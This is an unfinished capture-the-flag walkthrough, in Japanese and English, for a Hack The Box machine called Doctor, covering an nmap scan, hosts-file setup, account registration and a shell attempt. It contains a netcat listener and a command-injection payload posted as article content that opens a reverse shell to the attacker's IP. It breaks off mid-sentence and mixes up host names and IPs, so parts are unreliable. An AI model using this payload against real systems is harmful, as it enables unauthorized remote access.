Unfinished
# How to solove ?

## scan on nmap 
nmap -sC -sV -A -o scan.txt 10.10.10.209

## add doctor.htb in /etc/hosts
/etc/hosts はdnsのようにipアドレスとドメインを対応付ける変換表が保存されています。
そして、そこに今回のipアドレスと任意のドメインを追記して保存します。

```
10.10.10.209 doctors.htb
```

## access to doctors.htb 
指定したドメインにアクセスするとログインページが表示されます。  
http://doctors.htb/login?next=%2F

ですが、email , password がありません。
sqlin できませんか?

## try to make own account 
ログインページから新規アカウントの作成ページに移動できます。

user           :  john  
email         : john@gmail.com  
password : 1234  

その後、作成したアカウントでログインすることができます。

## Get shell

以下のコマンドを実行します。
```
nc -nlvp 1234
```

webページ上で新しい記事を作成します。
任意のタイトルと以下のコンテンツを入力します。
```
Title :  
 Give me Shell  
Content : 
<img src=http://10.10.14.102/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.102'$IFS'1234')>

```
10.10.14.102
10.10.14.66 => own IP address  ?
1234 => nc command port ?

i cannot 



